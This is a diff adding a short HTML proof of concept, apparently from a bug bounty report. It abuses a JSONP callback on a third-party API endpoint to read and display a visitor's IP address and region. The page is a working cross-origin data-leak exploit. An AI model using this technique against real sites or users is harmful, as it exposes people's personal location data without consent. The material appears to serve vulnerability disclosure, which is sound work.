@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+
+
+<title> POC</title>
+
+<script type="text/javascript">
+
+    function myCallback(data){
+
+        document.write("IP is : " , data.loc["ip"])
+        document.write("<br>")
+        document.write("Region is : " , data.loc["region_name"])
+    }
+
+</script>
+
+<script src="https://h1.brainhq.com/api/v2/bootstrap_sync?callback=myCallback"></script>
